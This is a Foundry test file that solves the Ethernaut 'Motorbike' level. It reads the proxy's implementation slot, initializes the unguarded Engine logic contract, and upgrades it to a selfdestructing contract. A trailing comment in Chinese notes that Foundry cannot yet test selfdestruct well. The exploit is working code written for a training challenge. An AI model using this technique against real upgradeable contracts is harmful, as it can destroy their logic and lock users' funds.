// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";

import {Motorbike, Engine, Destructive} from "../src/Motorbike.sol";

contract MotorbikeTest is Test {
    Motorbike motorbike;
    Engine engine;
    Destructive destructive;

    address alice = address(1);

    function setUp() public {
        engine = new Engine();
        destructive = new Destructive();

        vm.prank(alice);
        motorbike = new Motorbike(address(engine));
    }

    function getLogicAddr() public view returns (address) {
        address engineAddress = address(
            uint160(
                uint256(vm.load(address(motorbike), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc))
            )
        );
        return engineAddress;
    }

    function testAttack() public {
        address engineAddress = getLogicAddr();
        assertEq(engineAddress, address(engine));

        engine.initialize();
        console.log("Upgrader is :", engine.upgrader());

        engine.upgradeToAndCall(address(destructive), abi.encodeWithSignature("killed()"));

        //  foundry目前还没有比较好的测试 selfdestruct 的方法
    }
}
